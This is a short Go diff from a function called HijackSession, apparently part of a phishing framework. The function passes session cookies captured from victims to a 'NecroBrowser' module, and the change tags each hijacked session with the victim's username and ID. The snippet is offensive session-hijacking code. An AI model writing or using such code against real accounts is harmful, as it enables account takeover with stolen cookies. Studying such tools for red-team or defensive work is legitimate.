@@ -439,7 +439,9 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 				Provider:       t.Session.Config.NecroBrowser.Profile,
 				DebuggingPort:  t.Session.Config.InstrumentationPort + 1,
 				SessionCookies: sessCookies,
-				Keywords:       t.Session.Config.NecroBrowser.Keywords,
+				// TODO hack to pass more info for necrobrowser
+				//Keywords:       t.Session.Config.NecroBrowser.Keywords,
+				Keywords: []string{fmt.Sprintf("%s_%s", victim.Username, victim.ID)},
 			}
 
 			m, err := t.Session.Module("necrobrowser")
